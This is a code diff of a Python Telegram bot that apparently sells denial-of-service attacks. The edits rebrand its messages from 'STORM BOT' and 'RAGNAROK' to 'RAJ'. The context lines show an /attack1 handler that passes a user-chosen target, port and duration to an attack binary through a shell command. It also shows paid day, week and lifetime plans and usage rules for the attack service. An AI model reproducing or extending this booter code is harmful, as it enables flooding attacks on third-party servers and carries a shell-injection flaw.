@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY Aarya.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/+sUHNz0xm_205MTBl"
+    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY RAJ.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/+sUHNz0xm_205MTBl"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -247,7 +247,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./RAGNAROK {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+sUHNz0xm_205MTBl"
+                response = f"RAJ 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+sUHNz0xm_205MTBl"
         else:
             response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/+sUHNz0xm_205MTBl"  # Updated command syntax
     else:
@@ -315,7 +315,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By STORM BOT'''
+By RAJ BOT'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -335,7 +335,7 @@ Day--------> 250 Rs
 Week-------> 900 Rs
 Month------> 1600 Rs
 LifeTimes--> 2000 Rs
-By STORM BOT
+By RAJ BOT
 '''
     bot.reply_to(message, response)
 
